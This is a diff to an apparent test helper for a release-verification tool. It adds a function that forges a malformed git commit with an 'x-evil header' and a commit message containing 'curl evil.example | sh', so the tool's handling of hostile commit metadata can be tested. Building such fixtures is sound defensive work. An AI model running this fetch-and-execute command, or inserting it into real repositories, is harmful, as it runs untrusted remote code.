@@ -25,12 +25,15 @@ type CandidateOptions = {
 	readonly startFrom?: 'base' | 'diverged';
 	readonly extraBranchCommits?: readonly CandidateEdit[];
 	readonly omitCandidateBranch?: boolean;
+	readonly hostileCommit?: { readonly date?: string };
 };
 
 type VerifyOptions = {
 	readonly versionFiles?: string;
 	readonly changelogFiles?: string;
 	readonly tagPrefix?: string;
+	readonly increment?: string;
+	readonly commitMessage?: string;
 };
 
 type VerificationResult = {
@@ -56,6 +59,30 @@ export type ScenarioOptions = {
 function commitAll(directory: string, message: string): void {
 	runGit(directory, ['add', '--all']);
 	runGit(directory, ['commit', '--quiet', '--message', message]);
+}
+
+const HOSTILE_DATE = '1700000000 +0000';
+
+function rewriteTipAsHostile(
+	directory: string,
+	branch: string,
+	date: string
+): void {
+	const tree = runGit(directory, ['rev-parse', `${branch}^{tree}`]);
+	const parent = runGit(directory, ['rev-parse', `${branch}^`]);
+	const identity = `Evil Author <evil@example.com> ${date}`;
+	const content = `tree ${tree}\nparent ${parent}\nauthor ${identity}\ncommitter ${identity}\nx-evil header\n\nCloses #1 [skip ci] @someone curl evil.example | sh\n`;
+	const file = join(directory, '..', 'hostile_commit');
+	writeFileSync(file, content);
+	const hostile = runGit(directory, [
+		'hash-object',
+		'-t',
+		'commit',
+		'-w',
+		'--literally',
+		file,
+	]);
+	runGit(directory, ['update-ref', `refs/heads/${branch}`, hostile]);
 }
 
 function parseOutputs(content: string): Record<string, string> {
@@ -150,6 +177,13 @@ export function createReleaseScenario(
 			startPoint = 'diverged';
 		}
 		createBranch(CANDIDATE_BRANCH, startPoint, candidate.commits);
+		if (candidate.hostileCommit) {
+			rewriteTipAsHostile(
+				sourceDirectory,
+				CANDIDATE_BRANCH,
+				candidate.hostileCommit.date ?? HOSTILE_DATE
+			);
+		}
 		const refs = [`refs/heads/${CANDIDATE_BRANCH}`];
 		if (candidate.extraBranchCommits) {
 			createBranch(EXTRA_BRANCH, baseSha, candidate.extraBranchCommits);
@@ -182,6 +216,9 @@ export function createReleaseScenario(
 				VERSION_FILES: verifyOptions.versionFiles ?? 'package.json',
 				CHANGELOG_FILES: verifyOptions.changelogFiles ?? 'CHANGELOG.md',
 				TAG_PREFIX: verifyOptions.tagPrefix ?? 'v',
+				INCREMENT: verifyOptions.increment ?? 'minor',
+				COMMIT_MESSAGE:
+					verifyOptions.commitMessage ?? 'chore(release): ${version}',
 				GITHUB_REPOSITORY: REPOSITORY,
 				GITHUB_OUTPUT: outputFile,
 			},
